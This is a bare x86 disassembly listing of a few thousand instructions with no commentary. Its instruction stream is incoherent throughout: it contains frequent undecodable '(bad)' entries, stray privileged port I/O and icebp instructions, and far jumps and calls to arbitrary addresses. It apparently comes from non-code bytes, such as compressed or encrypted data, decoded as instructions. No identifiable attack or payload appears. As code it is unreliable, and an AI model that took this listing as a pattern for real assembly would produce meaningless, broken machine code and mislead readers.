  4a30de:	mov    eax,DWORD PTR [eax-0x4e7d37cc]
  4a30e4:	jno    0x4a308d
  4a30e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a30e7:	and    al,0xb3
  4a30e9:	sbb    eax,0x40e4e43c
  4a30ee:	retf   0x3303
  4a30f1:	jb     0x4a3110
  4a30f3:	arpl   WORD PTR ds:0x5f1084cd,sp
  4a30f9:	cmp    esi,DWORD PTR [ebx-0x6ac0e4d5]
  4a30ff:	xor    BYTE PTR [esi],ah
  4a3101:	in     eax,dx
  4a3102:	inc    ebx
  4a3103:	popf   
  4a3104:	jnp    0x4a30c3
  4a3106:	add    esp,DWORD PTR [edi]
  4a3108:	sbb    esp,DWORD PTR [ebx+0x3f]
  4a310b:	frstor [ecx]
  4a310d:	and    al,0xc6
  4a310f:	loop   0x4a3091
  4a3111:	jbe    0x4a3117
  4a3113:	push   0x0
  4a3115:	jmp    0x4a3126
  4a3117:	cmp    DWORD PTR [esp+ebp*1-0x1fe2fcc6],edx
  4a311e:	sbb    al,0xd4
  4a3120:	sbb    al,0x81
  4a3122:	cld    
  4a3123:	les    eax,FWORD PTR [edx*1-0x6f6676ba]
  4a312a:	xlat   BYTE PTR ds:[ebx]
  4a312b:	mov    ebp,esp
  4a312d:	ins    DWORD PTR es:[edi],dx
  4a312e:	and    DWORD PTR [ecx-0x6f88d8f8],esi
  4a3134:	sbb    BYTE PTR [edi],al
  4a3136:	rol    BYTE PTR [edx],1
  4a3138:	pop    edi
  4a3139:	push   ecx
  4a313a:	jno    0x4a318f
  4a313c:	lock xchg edi,eax
  4a313e:	or     eax,0x460ae890
  4a3143:	mov    al,0x7b
  4a3145:	out    0x60,eax
  4a3147:	lock inc ebp
  4a3149:	nop
  4a314a:	das    
  4a314b:	xor    BYTE PTR [esi-0x50],0xbe
  4a314f:	popw   ds
  4a3151:	icebp  
  4a3152:	out    0x11,eax
  4a3154:	out    0x12,al
  4a3156:	or     eax,0xb30aeb46
  4a315b:	(bad)  
  4a315c:	aam    0xd1
  4a315e:	push   es
  4a315f:	xchg   BYTE PTR [eax],ah
  4a3161:	sub    eax,0x896dc5b7
  4a3166:	enter  0xc757,0x10
  4a316a:	jmp    DWORD PTR [ebp-0x7d]
  4a316d:	es pushf 
  4a316f:	les    edx,FWORD PTR [ecx+0x1e335b3d]
  4a3175:	sub    bl,BYTE PTR [esi]
  4a3177:	cdq    
  4a3178:	sbb    al,0xc9
  4a317a:	shl    BYTE PTR [esi-0x68e1e0ec],0xcb
  4a3181:	and    DWORD PTR [esi-0xe],ecx
  4a3184:	pop    ebp
  4a3185:	jecxz  0x4a31a6
  4a3187:	lahf   
  4a3188:	xor    esi,DWORD PTR [eax+edx*1-0x37]
  4a318c:	cmp    BYTE PTR [ebx+edi*8],0x96
  4a3190:	je     0x4a319d
  4a3192:	pop    DWORD PTR [ebp-0x1d2ce229]
  4a3198:	inc    ecx
  4a3199:	ficomp WORD PTR [esi]
  4a319b:	fld    DWORD PTR [ecx]
  4a319d:	xor    ecx,0x25
  4a31a0:	or     bh,BYTE PTR [esp+edx*1+0x40]
  4a31a4:	jbe    0x4a3185
  4a31a6:	psubd  mm1,QWORD PTR [esi-0x7ac28b64]
  4a31ad:	mov    eax,DWORD PTR [ecx+edx*4-0x1b70bcea]
  4a31b4:	iret   
  4a31b5:	xchg   ebx,eax
  4a31b6:	add    DWORD PTR [edi-0x236d2883],ebx
  4a31bc:	fwait
  4a31bd:	mov    ds:0xa27a533a,eax
  4a31c2:	jle    0x4a31cf
  4a31c4:	inc    ebx
  4a31c5:	jo     0x4a3158
  4a31c7:	pushf  
  4a31c8:	fwait
  4a31c9:	test   DWORD PTR [ebx+0x45],eax
  4a31cc:	daa    
  4a31cd:	pop    ebp
  4a31ce:	rcl    ebp,cl
  4a31d0:	cmp    BYTE PTR [esi],ch
  4a31d2:	push   ss
  4a31d3:	cmc    
  4a31d4:	rol    BYTE PTR [edi],cl
  4a31d6:	sbb    esp,DWORD PTR [ebp-0x26f8db90]
  4a31dc:	or     DWORD PTR [ebp-0x79],ebx
  4a31df:	jmp    0xccb7:0x14250ca4
  4a31e6:	sbb    al,0x6f
  4a31e8:	(bad)  
  4a31e9:	fs pusha 
  4a31eb:	jne    0x4a31c7
  4a31ed:	into   
  4a31ee:	add    ch,ch
  4a31f0:	out    0x24,al
  4a31f2:	mov    DWORD PTR [ebx+esi*1+0x21],esp
  4a31f6:	add    DWORD PTR [eax-0x1bf196e4],edx
  4a31fc:	leave  
  4a31fd:	xchg   edx,eax
  4a31fe:	add    BYTE PTR [edx+0x37550124],ch
  4a3204:	aad    0xc0
  4a3206:	or     ebx,ebp
  4a3208:	addr16 popf 
  4a320a:	pop    esi
  4a320b:	fist   WORD PTR [ebx]
  4a320d:	rcr    BYTE PTR [eax+ecx*8+0x76],cl
  4a3211:	adc    BYTE PTR [eax],ah
  4a3213:	jmp    0x4a3248
  4a3215:	and    edi,ebx
  4a3217:	mov    ch,0x32
  4a3219:	imul   ebp,DWORD PTR [ecx],0x7f1041d1
  4a321f:	add    DWORD PTR [esp+eiz*2],ecx
  4a3222:	in     al,dx
  4a3223:	sbb    esp,DWORD PTR [eax]
  4a3225:	retf   0x840f
  4a3228:	sub    eax,0xa58c87bb
  4a322d:	daa    
  4a322e:	add    al,0x2d
  4a3230:	mov    ebx,0xbd0f56ab
  4a3235:	aam    0x2d
  4a3237:	jmp    0xcb9d:0x4a0871ca
  4a323e:	fsubr  QWORD PTR [edx+esi*8]
  4a3241:	sahf   
  4a3242:	out    dx,eax
  4a3243:	or     al,0xfd
  4a3245:	and    BYTE PTR [ecx],dl
  4a3247:	jge    0x42d7b8c1
  4a324d:	dec    esi
  4a324e:	fisub  WORD PTR [ecx+0x1b5bf32]
  4a3254:	and    esi,edx
  4a3256:	inc    ecx
  4a3257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a3258:	cmp    al,0x4
  4a325a:	push   cs
  4a325b:	jge    0x4a326b
  4a325d:	cmp    cl,BYTE PTR [edi-0x5f]
  4a3260:	mov    ebx,0xde41e49
  4a3265:	fcom   DWORD PTR [esi]
  4a3267:	dec    esp
  4a3268:	mov    ebx,0x30f4bd42
  4a326d:	push   ss
  4a326e:	push   ds
  4a326f:	push   edi
  4a3270:	add    eax,0x69c0b2a
  4a3275:	loopne 0x4a32e9
  4a3277:	icebp  
  4a3278:	and    eax,0x56adff79
  4a327d:	cmp    edx,esp
  4a327f:	pusha  
  4a3280:	mov    ch,0xf7
  4a3282:	daa    
  4a3283:	sahf   
  4a3284:	mov    edi,0x8f205811
  4a3289:	mov    eax,ds:0x9223997a
  4a328e:	add    esp,0xd6f282c
  4a3294:	dec    edi
  4a3295:	inc    esp
  4a3296:	mov    al,ds:0x1143e49a
  4a329b:	pop    esi
  4a329c:	pop    ds
  4a329d:	(bad)  
  4a329e:	adc    edi,DWORD PTR [edx]
  4a32a0:	cmp    BYTE PTR [esi+eax*4+0x17],bh
  4a32a4:	test   DWORD PTR [eax],edx
  4a32a6:	or     eax,0x20620000
  4a32ab:	aam    0x55
  4a32ad:	pop    es
  4a32ae:	adc    bh,bh
  4a32b0:	outs   dx,BYTE PTR ds:[esi]
  4a32b1:	add    ebx,0x19
  4a32b4:	fisubr WORD PTR [edx]
  4a32b6:	push   ecx
  4a32b7:	test   eax,0x7fbe5f7d
  4a32bc:	or     BYTE PTR [ebp+0xcde6f7b],ch
  4a32c2:	leave  
  4a32c3:	(bad)  
  4a32c4:	and    al,0xd1
  4a32c6:	bswap  ebp
  4a32c8:	xchg   ebx,eax
  4a32c9:	xlat   BYTE PTR ds:[ebx]
  4a32ca:	sahf   
  4a32cb:	or     DWORD PTR [ebx-0x32228336],esi
  4a32d1:	test   eax,0x5e4e190c
  4a32d6:	enter  0xca0,0xd3
  4a32da:	sbb    cl,BYTE PTR [ebx+0x7fdd991c]
  4a32e0:	nop
  4a32e1:	bswap  esi
  4a32e3:	shr    DWORD PTR [ebx],1
  4a32e5:	(bad)  
  4a32e6:	cmp    edx,eax
  4a32e8:	jbe    0x4a3316
  4a32ea:	and    al,0x7d
  4a32ec:	push   0x7b
  4a32ee:	jb     0x4a3338
  4a32f0:	push   es
  4a32f1:	popa   
  4a32f2:	push   0xdf2031c
  4a32f7:	mov    eax,ds:0x49c173d6
  4a32fc:	cmp    DWORD PTR [ecx-0x60da1ba9],edi
  4a3302:	xchg   edx,eax
  4a3303:	dec    ebx
  4a3304:	dec    esi
  4a3305:	add    DWORD PTR [ebx+0x75b9c1e1],eax
  4a330b:	add    BYTE PTR [edx+0x72],cl
  4a330e:	stos   BYTE PTR es:[edi],al
  4a330f:	mov    eax,0x86b5da77
  4a3314:	mov    ah,0x42
  4a3316:	add    edx,DWORD PTR [edi+0x43]
  4a3319:	push   esp
  4a331a:	imul   ecx,DWORD PTR [eax+0x17],0x5b
  4a331e:	add    edx,DWORD PTR [edi+0xd]
  4a3321:	jmp    0x6d9f5f68
  4a3326:	add    al,0x66
  4a3328:	stos   DWORD PTR es:[edi],eax
  4a3329:	mov    dh,0x6a
  4a332b:	push   edi
  4a332c:	gs pop ss
  4a332e:	add    eax,0x162b00c0
  4a3333:	push   ecx
  4a3334:	addr16 mov edi,0xaea0f980
  4a333a:	inc    esi
  4a333b:	cmc    
  4a333c:	xor    BYTE PTR [ebx],cl
  4a333e:	fdiv   DWORD PTR [edi]
  4a3340:	inc    esi
  4a3341:	jmp    0x4a3377
  4a3343:	das    
  4a3344:	lock add eax,0xe32d840a
  4a334a:	sbb    eax,edi
  4a334c:	sbb    eax,DWORD PTR [edx+edi*4]
  4a334f:	or     ecx,DWORD PTR [ebx+0xb]
  4a3352:	cld    
  4a3353:	or     al,0x74
  4a3355:	sbb    DWORD PTR [eax+0x7fd1f135],eax
  4a335b:	adc    dl,BYTE PTR [edi-0x76]
  4a335e:	push   ds
  4a335f:	clc    
  4a3360:	lods   al,BYTE PTR ds:[esi]
  4a3361:	add    BYTE PTR [ecx],ch
  4a3363:	and    dh,dh
  4a3365:	or     bl,ah
  4a3367:	mov    ebx,DWORD PTR [esi-0x530d9d64]
  4a336d:	(bad)  
  4a336e:	daa    
  4a336f:	(bad)  
  4a3370:	or     cl,ch
  4a3372:	or     cl,BYTE PTR [edx]
  4a3374:	repz imul ebp,DWORD PTR [esi],0x394f4f1c
  4a337b:	sbb    DWORD PTR [edi],ecx
  4a337d:	dec    esi
  4a337e:	lea    esp,[esi]
  4a3380:	pop    es
  4a3381:	mov    cl,0xa
  4a3383:	fisubr WORD PTR [eax+eax*1+0x39]
  4a3387:	nop
  4a3388:	pop    ss
  4a3389:	sbb    esp,DWORD PTR [ebx-0x32]
  4a338c:	add    dh,dl
  4a338e:	cmp    al,0x79
  4a3390:	mov    DWORD PTR [ebp-0x8],0xd01834ac
  4a3397:	repnz mov esp,0xac0f36e2
  4a339d:	and    DWORD PTR cs:[ecx+0x71],edi
  4a33a1:	test   eax,0x34e170a
  4a33a6:	push   0xe5a01544
  4a33ab:	sub    eax,0xab494661
  4a33b0:	mov    esp,0x58370560
  4a33b5:	add    DWORD PTR [edx+eiz*8+0x571d73c],eax
  4a33bc:	push   es
  4a33bd:	add    eax,0x657e32bc
  4a33c2:	mov    ecx,0xb1137453
  4a33c7:	aas    
  4a33c8:	or     cl,dh
  4a33ca:	and    eax,0xbc097628
  4a33cf:	addr16 repz dec ecx
  4a33d2:	add    al,0x1e
  4a33d4:	pop    ss
  4a33d5:	test   al,0xf0
  4a33d7:	adc    dh,BYTE PTR [ebx+0x13]
  4a33da:	scas   eax,DWORD PTR es:[edi]
  4a33db:	add    al,0x22
  4a33dd:	(bad)
  4a33e1:	sbb    ah,0x20
  4a33e4:	js     0x4a341d
  4a33e6:	dec    esp
  4a33e7:	fcmovne st,st(6)
  4a33e9:	test   al,0x86
  4a33eb:	mov    dh,0x32
  4a33ed:	repz je 0x4a33b6
  4a33f0:	stos   BYTE PTR es:[edi],al
  4a33f1:	mov    DWORD PTR [ebp-0x1835016b],0x3db9741b
  4a33fb:	aas    
  4a33fc:	outs   dx,BYTE PTR ds:[esi]
  4a33fd:	fcmove st,st(2)
  4a33ff:	call   0xcef55925
  4a3404:	inc    edx
  4a3405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3406:	js     0x4a33e2
  4a3408:	retf   0xa578
  4a340b:	ret    0x9914
  4a340e:	call   0x304b:0xa7279272
  4a3415:	or     DWORD PTR [edi],esp
  4a3417:	or     DWORD PTR [edi+0x17],ebx
  4a341a:	xor    dl,BYTE PTR [ebx+edx*4]
  4a341d:	adc    ecx,DWORD PTR [ebx]
  4a341f:	or     DWORD PTR [ebp+0x30],eax
  4a3422:	jb     0x4a342e
  4a3424:	cmp    DWORD PTR [eax],edx
  4a3426:	lods   eax,DWORD PTR ds:[esi]
  4a3427:	xlat   BYTE PTR ds:[ebx]
  4a3428:	lods   eax,DWORD PTR ds:[esi]
  4a3429:	sar    DWORD PTR [edx-0x6cfbed7f],1
  4a342f:	cmp    al,0x74
  4a3431:	inc    esp
  4a3432:	ret    0xdbf0
  4a3435:	js     0x4a345b
  4a3437:	jb     0x4a3427
  4a3439:	jbe    0x4a3475
  4a343b:	fs add bh,BYTE PTR fs:[ecx-0xe]
  4a3440:	sub    eax,0xda07f814
  4a3445:	pop    ds
  4a3446:	ror    BYTE PTR [ebx],cl
  4a3448:	adc    al,0xdf
  4a344a:	ja     0x4a3412
  4a344c:	in     eax,0x26
  4a344e:	jns    0x4a34c2
  4a3450:	xchg   cl,al
  4a3452:	ffreep st(0)
  4a3454:	pop    es
  4a3455:	mov    bh,0x7
  4a3457:	ret    
  4a3458:	push   0x48
  4a345a:	out    dx,al
  4a345b:	inc    edx
  4a345c:	fwait
  4a345d:	mov    ecx,0xf2003257
  4a3462:	loope  0x4a3454
  4a3464:	jecxz  0x4a346d
  4a3466:	lock leave 
  4a3468:	xchg   ebx,eax
  4a3469:	sub    DWORD PTR [ecx-0x51],edi
  4a346c:	dec    ecx
  4a346d:	lock scas eax,DWORD PTR es:[edi]
  4a346f:	inc    ebx
  4a3470:	and    al,0x43
  4a3472:	and    DWORD PTR [ebx],edx
  4a3474:	lock lock outs dx,DWORD PTR ds:[esi]
  4a3477:	pusha  
  4a3478:	and    BYTE PTR [ebx-0x10],al
  4a347b:	jno    0x4a3446
  4a347d:	cmp    ah,bl
  4a347f:	push   eax
  4a3480:	or     eax,0x720698ed
  4a3485:	inc    edx
  4a3486:	jp     0x4a3435
  4a3488:	add    eax,0x677edbd
  4a348d:	and    bh,BYTE PTR [edx+0x14]
  4a3490:	js     0x4a3500
  4a3492:	push   es
  4a3493:	fcmovnu st,st(2)
  4a3495:	adc    al,0x71
  4a3497:	pusha  
  4a3498:	and    esp,DWORD PTR [ebx+0x72]
  4a349b:	push   edx
  4a349c:	push   es
  4a349d:	fisub  WORD PTR [esi]
  4a349f:	enter  0x9023,0xcf
  4a34a3:	xchg   ebp,eax
  4a34a4:	add    edi,ebp
  4a34a6:	(bad)  
  4a34a7:	push   DWORD PTR [eax-0x6fddcb6c]
  4a34ad:	push   ebx
  4a34ae:	mov    al,0x8e
  4a34b0:	pop    ss
  4a34b1:	popf   
  4a34b2:	adc    DWORD PTR fs:[edx+0x56],0x5d054905
  4a34ba:	lock dec esi
  4a34bc:	ret    
  4a34bd:	xor    ah,BYTE PTR [ecx]
  4a34bf:	call   0xa74f5625
  4a34c4:	call   0x2965e1
  4a34c9:	mov    cl,0xc9
  4a34cb:	stos   BYTE PTR es:[edi],al
  4a34cc:	inc    eax
  4a34cd:	dec    esi
  4a34ce:	and    DWORD PTR [ecx-0x36e86c3d],esi
  4a34d4:	add    WORD PTR [eax],bx
  4a34d7:	add    al,0xf7
  4a34d9:	add    ecx,ecx
  4a34db:	or     DWORD PTR [ecx],edi
  4a34dd:	leave  
  4a34de:	out    dx,al
  4a34df:	add    edi,edx
  4a34e1:	adc    edx,edx
  4a34e3:	add    ecx,DWORD PTR [esi+0x115c3103]
  4a34e9:	xchg   ebp,eax
  4a34ea:	mov    bl,0x14
  4a34ec:	dec    DWORD PTR [esi]
  4a34ee:	adc    al,0xc8
  4a34f0:	sub    DWORD PTR [ebx+0x5802d60e],esi
  4a34f6:	and    al,0x9b
  4a34f8:	inc    ecx
  4a34f9:	add    ecx,ecx
  4a34fb:	add    bh,BYTE PTR [esp+eiz*8]
  4a34fe:	enter  0x3b0f,0xa2
  4a3502:	add    bl,BYTE PTR [ecx-0x5deefafe]
  4a3508:	call   0x2c7b6ee
  4a350d:	lahf   
  4a350e:	aas    
  4a350f:	add    bh,BYTE PTR [ecx]
  4a3511:	test   DWORD PTR [esp+esi*4+0x5e63b469],edi
  4a3518:	and    al,0x9b
  4a351a:	test   eax,0x57017810
  4a351f:	add    DWORD PTR [edi],esp
  4a3521:	in     al,0x24
  4a3523:	dec    edi
  4a3524:	dec    esi
  4a3525:	add    DWORD PTR [esi+0xe01320f],eax
  4a352b:	les    esi,FWORD PTR [eax+0x25]
  4a352e:	push   es
  4a352f:	xchg   ebp,eax
  4a3530:	mov    ch,0xb4
  4a3532:	adc    eax,0xb5429c81
  4a3537:	scas   al,BYTE PTR es:[edi]
  4a3538:	or     DWORD PTR [ebx+0x743ac9e8],ebp
  4a353e:	xor    DWORD PTR [edi],ebp
  4a3540:	and    al,0xbc
  4a3542:	sub    BYTE PTR ds:0x10181977,dl
  4a3548:	mov    cl,0x52
  4a354a:	pop    eax
  4a354b:	pop    esi
  4a354c:	ja     0x4a34fb
  4a354e:	lods   al,BYTE PTR ds:[esi]
  4a354f:	sahf   
  4a3550:	dec    ebp
  4a3551:	sbb    BYTE PTR [eax+0xb975232],ch
  4a3557:	jmp    FWORD PTR [edi]
  4a3559:	sub    al,ch
  4a355b:	out    0x24,al
  4a355d:	into   
  4a355e:	dec    esi
  4a355f:	cmp    esp,DWORD PTR [eax]
  4a3561:	push   esp
  4a3562:	add    al,0xdc
  4a3564:	shl    BYTE PTR [eax+ebx*2],0xb
  4a3568:	adc    bh,bh
  4a356a:	jo     0x4a3576
  4a356c:	(bad)  
  4a356d:	cmc    
  4a356e:	inc    esi
  4a356f:	dec    DWORD PTR [esi-0x75]
  4a3572:	test   BYTE PTR [ebp+0x48],0x3b
  4a3576:	test   DWORD PTR [ebx],edx
  4a3578:	je     0x4a352b
  4a357a:	and    esp,esi
  4a357c:	mov    esi,DWORD PTR [ebx+0x1df2d2f2]
  4a3582:	xor    ch,dh
  4a3584:	mov    ebx,0xd22603a6
  4a3589:	je     0x4a35dc
  4a358b:	(bad)  [ecx]
  4a358d:	stos   BYTE PTR es:[edi],al
  4a358e:	cwde   
  4a358f:	pop    es
  4a3590:	leave  
  4a3591:	test   eax,0x37eaf48
  4a3596:	pop    esi
  4a3597:	inc    ebx
  4a3598:	xchg   ebx,eax
  4a3599:	inc    edi
  4a359a:	lods   al,BYTE PTR ds:[esi]
  4a359b:	add    ebp,DWORD PTR ds:0x5f230352
  4a35a1:	push   0xbaa055d3
  4a35a6:	dec    ecx
  4a35a7:	or     DWORD PTR [edi],esi
  4a35a9:	add    ebp,DWORD PTR [esi]
  4a35ab:	cld    
  4a35ac:	dec    esp
  4a35ad:	call   0x2b51:0x70e30390
  4a35b4:	shl    DWORD PTR [esi],1
  4a35b6:	adc    eax,0xd1d965fa
  4a35bb:	ja     0x4a35bd
  4a35bd:	ins    DWORD PTR es:[edi],dx
  4a35be:	shl    ah,1
  4a35c0:	test   DWORD PTR [edi+esi*8],ebx
  4a35c3:	add    cl,BYTE PTR [ecx*1-0x48fe316d]
  4a35ca:	jbe    0x4a35d8
  4a35cc:	mov    ds:0xd0399f48,eax
  4a35d1:	call   0x5092eb97
  4a35d6:	call   0xb479:0x7d039711
  4a35dd:	add    ah,BYTE PTR [edi]
  4a35df:	jmp    0x4a3605
  4a35e1:	cwde   
  4a35e2:	pop    ds
  4a35e3:	sahf   
  4a35e4:	ficom  WORD PTR [ebp+0x1002973a]
  4a35ea:	push   edi
  4a35eb:	mov    DWORD PTR [eax],ebp
  4a35ed:	inc    esi
  4a35ee:	scas   eax,DWORD PTR es:[edi]
  4a35ef:	loopne 0x4a364a
  4a35f1:	test   BYTE PTR [edx+0x27485b8],ah
  4a35f7:	pusha  
  4a35f8:	push   cs
  4a35f9:	leave  
  4a35fa:	add    eax,0xc4c6b17
  4a35ff:	or     ecx,DWORD PTR [edi+0x4d094758]
  4a3605:	fild   WORD PTR [ecx]
  4a3607:	call   DWORD PTR [eax-0x6634e4dd]
  4a360d:	fnsave [esi]
  4a360f:	add    ch,BYTE PTR ds:0x9ec70002
  4a3615:	outs   dx,DWORD PTR ds:[esi]
  4a3616:	and    cl,ah
  4a3618:	inc    ecx
  4a3619:	inc    esi
  4a361a:	sar    DWORD PTR [ebx+0xf],1
  4a361d:	push   eax
  4a361e:	lods   al,BYTE PTR ds:[esi]
  4a361f:	in     eax,0xb7
  4a3621:	jg     0x4a36a2
  4a3623:	clc    
  4a3624:	(bad)  
  4a3625:	mov    ebp,0xedc8620f
  4a362a:	jmp    0x360e:0xd4d96f01
  4a3631:	cmp    DWORD PTR [edi+eiz*8+0x50],0xa
  4a3636:	ret    0xb701
  4a3639:	arpl   WORD PTR [ebp-0x46ef2d1a],bx
  4a363f:	or     al,0xb0
  4a3641:	int3   
  4a3642:	xchg   DWORD PTR [ebx+ebx*1],ecx
  4a3645:	in     al,0x84
  4a3647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a3648:	add    DWORD PTR [ebx+ebx*4+0x1c3a89bf],ebx
  4a364f:	in     al,0x20
  4a3651:	aas    
  4a3652:	(bad)  
  4a3653:	je     0x4a366f
  4a3655:	dec    ebx
  4a3656:	adc    eax,0x70e90ec3
  4a365b:	push   ebp
  4a365c:	or     eax,0x91cf7b5e
  4a3661:	popa   
  4a3662:	ja     0x4a3690
  4a3664:	mov    ebx,0x1d358148
  4a3669:	sbb    al,0x87
  4a366b:	adc    dh,BYTE PTR [ebp+0x2f]
  4a366e:	add    DWORD PTR [ebp-0x25],eax
  4a3671:	fadd   st,st(5)
  4a3673:	lods   al,BYTE PTR ds:[esi]
  4a3674:	sub    DWORD PTR [ecx+0x13],0xe79849f
  4a367b:	fwait
  4a367c:	inc    edx
  4a367d:	sahf   
  4a367e:	test   dl,dh
  4a3680:	add    dh,dl
  4a3682:	imul   ecx,DWORD PTR [ebp+edi*8-0x28ca7519],0x69bd01e3
  4a368d:	mov    eax,ds:0x6bb1390b
  4a3692:	fisttp WORD PTR [eax+0x8828475]
  4a3698:	in     al,dx
  4a3699:	mov    bl,bh
  4a369b:	jmp    0x4a3711
  4a369d:	outs   dx,DWORD PTR ds:[esi]
  4a369e:	jge    0x4a370d
  4a36a0:	mov    edi,0xe46c5fe4
  4a36a5:	imul   eax,DWORD PTR ds:0xdf5756d2,0xffffffeb
  4a36ac:	dec    eax
  4a36ad:	inc    ecx
  4a36ae:	mov    edi,0x7b4e4b88
  4a36b3:	jae    0x4a36cf
  4a36b5:	push   edi
  4a36b6:	je     0x4a36e2
  4a36b8:	jecxz  0x4a364d
  4a36ba:	daa    
  4a36bb:	(bad)  
  4a36bc:	cmp    BYTE PTR [ebx-0x3a],bl
  4a36bf:	or     ebx,DWORD PTR [ebx-0x58]
  4a36c2:	adc    eax,0x55c6150b
  4a36c7:	sub    al,0x28
  4a36c9:	clc    
  4a36ca:	mov    DWORD PTR [ecx],esi
  4a36cc:	stc    
  4a36cd:	fwait
  4a36ce:	pop    eax
  4a36cf:	ja     0x4a3746
  4a36d1:	and    BYTE PTR [ecx],ch
  4a36d3:	add    BYTE PTR [edx-0x59],0xa9
  4a36d7:	sub    al,BYTE PTR [eax+edx*2]
  4a36da:	fldcw  WORD PTR [ebp-0x5b]
  4a36dd:	add    eax,0x546a7c80
  4a36e2:	lea    ebx,[eax+ecx*1-0x4c]
  4a36e6:	adc    al,0x56
  4a36e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a36e9:	and    eax,0x5b3099be
  4a36ee:	xor    DWORD PTR [eax-0x5d9c074c],esp
  4a36f4:	push   cs
  4a36f5:	add    al,BYTE PTR [eax+0x1a]
  4a36f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a36f9:	pop    edx
  4a36fa:	xor    eax,DWORD PTR [ecx]
  4a36fc:	add    ch,BYTE PTR [ebx-0x35]
  4a36ff:	cmp    eax,0x343cf96
  4a3704:	xlat   BYTE PTR ds:[ebx]
  4a3705:	jmp    0xd690b9a4
  4a370a:	adc    al,0xe6
  4a370c:	dec    eax
  4a370d:	cmp    ecx,DWORD PTR [eax+eiz*8]
  4a3710:	add    dl,BYTE PTR [edi+0x3a]
  4a3713:	sub    al,0x5
  4a3715:	mov    al,ds:0xa7dad3d5
  4a371a:	stc    
  4a371b:	popa   
  4a371c:	sub    ebx,DWORD PTR [ebp+edx*4-0x14e5ab0]
  4a3723:	sub    BYTE PTR [eax],ch
  4a3725:	and    edx,DWORD PTR [ebp-0x3e007f1f]
  4a372b:	cmp    BYTE PTR [eax+ebx*1],0x54
  4a372f:	jne    0x4a37a1
  4a3731:	nop
  4a3732:	cdq    
  4a3733:	dec    esp
  4a3734:	mov    bl,0x70
  4a3736:	push   ss
  4a3737:	frstor ds:[eax+ebp*2]
  4a373b:	gs or  al,0xa8
  4a373e:	cwde   
  4a373f:	sbb    dl,bh
  4a3741:	push   eax
  4a3742:	xor    DWORD PTR [edi+0x51c14c45],edx
  4a3748:	nop
  4a3749:	stc    
  4a374a:	aaa    
  4a374b:	jb     0x4a3767
  4a374d:	lods   eax,DWORD PTR ds:[esi]
  4a374e:	imul   esi,DWORD PTR [ecx+0x1f],0x68
  4a3752:	adc    BYTE PTR [esi+0x70],cl
  4a3755:	sbb    eax,DWORD PTR [edi+esi*4]
  4a3758:	adc    BYTE PTR [ebx+ecx*1+0x1],al
  4a375c:	sar    bl,0x6
  4a375f:	dec    edi
  4a3760:	ret    
  4a3761:	arpl   di,bx
  4a3763:	je     0x4a36f6
  4a3765:	out    0x28,al
  4a3767:	jg     0x4a379f
  4a3769:	cmp    BYTE PTR ds:0xb7b8eda9,0xb
  4a3770:	mov    esp,0x400b80f4
  4a3775:	and    esi,ebp
  4a3777:	sbb    DWORD PTR [eax+0x63],esp
  4a377a:	or     BYTE PTR [ecx+0x68751803],ah
  4a3780:	xchg   BYTE PTR [edi-0x1e],ch
  4a3783:	inc    ebx
  4a3784:	scas   al,BYTE PTR es:[edi]
  4a3785:	and    edx,0xfffffff8
  4a3788:	adc    BYTE PTR [eax],ah
  4a378a:	dec    edx
  4a378b:	pop    eax
  4a378c:	xchg   edx,eax
  4a378d:	mov    esp,ecx
  4a378f:	push   edi
  4a3790:	jne    0x4a37cb
  4a3792:	xor    DWORD PTR [eax],eax
  4a3794:	sbb    al,0xe
  4a3796:	inc    edx
  4a3797:	retf   
  4a3798:	gs ret 0xd94b
  4a379c:	mov    eax,ds:0xe0023dd5
  4a37a1:	pop    ebp
  4a37a2:	sbb    al,0xb1
  4a37a4:	in     eax,dx
  4a37a5:	mov    ebp,0xc0a81690
  4a37aa:	mov    al,0x41
  4a37ac:	mov    bl,0x2
  4a37ae:	xor    BYTE PTR [edi+0x2e2cd660],dh
  4a37b4:	jno    0x4a3799
  4a37b6:	icebp  
  4a37b7:	in     eax,0x72
  4a37b9:	mov    al,ds:0x613a80dc
  4a37be:	sub    BYTE PTR [ebx],cl
  4a37c0:	adc    BYTE PTR [ecx+eiz*1],ch
  4a37c3:	in     eax,0x6f
  4a37c5:	loope  0x4a374e
  4a37c7:	sar    DWORD PTR [esi+0xa],0x80
  4a37cb:	push   edx
  4a37cc:	jne    0x4a3808
  4a37ce:	sar    DWORD PTR [ebx-0x1fbd22f8],0xbf
  4a37d5:	mov    WORD PTR [ebx-0x69],ss
  4a37d8:	cmp    DWORD PTR gs:0x62395407,0x81070c1a
  4a37e3:	shl    DWORD PTR [ebp-0x79c71420],0x28
  4a37ea:	loopne 0x4a3771
  4a37ec:	cmp    DWORD PTR [ebp+0x1c032433],0x69c7a018
  4a37f6:	pop    esp
  4a37f7:	or     eax,DWORD PTR [esi-0x77fe68a0]
  4a37fd:	inc    ecx
  4a37fe:	sub    BYTE PTR [edx],dl
  4a3800:	lock (bad) 
  4a3802:	jge    0x4a3784
  4a3804:	(bad)  
  4a3805:	or     al,0x82
  4a3807:	jg     0x4a37ae
  4a3809:	adc    al,0x7
  4a380b:	mov    eax,0x3a0d0af8
  4a3810:	add    cl,BYTE PTR [eax+0x7b]
  4a3813:	mov    eax,0x287717eb
  4a3818:	ins    BYTE PTR es:[edi],dx
  4a3819:	int3   
  4a381a:	inc    eax
  4a381b:	jl     0x4a3841
  4a381d:	push   ecx
  4a381e:	or     eax,0xd013e851
  4a3823:	ret    0x9a0c
  4a3826:	lds    eax,FWORD PTR [ebx-0x539737b6]
  4a382c:	pop    edx
  4a382d:	adc    al,0xfe
  4a382f:	fwait
  4a3830:	inc    ecx
  4a3831:	push   eax
  4a3832:	(bad)  
  4a3833:	push   eax
  4a3834:	pop    ss
  4a3835:	add    edi,DWORD PTR [eax]
  4a3837:	repz push ecx
  4a3839:	test   BYTE PTR [ebx-0x9277421],cl
  4a383f:	cmp    ebx,0x6c75b01d
  4a3845:	jo     0x4a3832
  4a3847:	add    dh,BYTE PTR [eax-0x7ba243e0]
  4a384d:	shl    DWORD PTR [ecx-0xa],1
  4a3850:	or     eax,0x7a707789
  4a3855:	iret   
  4a3856:	cmp    DWORD PTR [edi-0xbb87d1e],0x36
  4a385d:	sahf   
  4a385e:	sti    
  4a385f:	mov    eax,ebx
